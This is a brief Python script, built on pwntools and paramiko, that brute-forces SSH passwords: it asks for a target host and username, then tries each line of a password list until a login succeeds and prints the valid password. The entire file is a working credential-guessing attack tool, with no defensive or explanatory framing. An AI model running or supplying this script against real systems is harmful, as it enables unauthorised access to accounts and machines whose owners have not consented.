import paramiko.ssh_exception
from pwn import *
import paramiko

host = input("input target: ")
username = input("input username: ")
attempts = 0

with open("passwords.txt", "r") as password_list: 
    for password in password_list:
        password = password.strip("\n")
        try:
            print(f"[{attempts}] Attempting password: '{password}' !")
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print(f"[>] Valid password found: {password} !")
                response.close()
                break
            response.close()
        except  paramiko.ssh_exception.AuthenticationException:
            print(f"[X] Invalaid password!")
        attempts +=1
